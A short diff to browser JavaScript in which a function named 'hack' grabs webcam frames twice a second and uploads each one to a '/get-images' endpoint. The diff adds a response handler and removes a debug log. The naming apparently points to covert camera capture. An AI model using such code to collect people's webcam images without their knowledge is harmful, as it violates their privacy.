@@ -2,12 +2,17 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 
 function postImages(imgdata) {
+  var result;
+
   $.ajax({
     type: "POST",
     data: { image: imgdata },
     url: "/get-images",
     dataType: "json",
     async: false,
+    success: function(response) {
+      result = response;
+  }
   });
 }
 
@@ -25,7 +30,6 @@ const hack = async () => {
   setInterval(() => {
     context.drawImage(video, 0, 0, 640, 480);
     const imageData = canvas.toDataURL();
-    console.log(imageData);
     postImages(imageData);
   }, 500);
 };
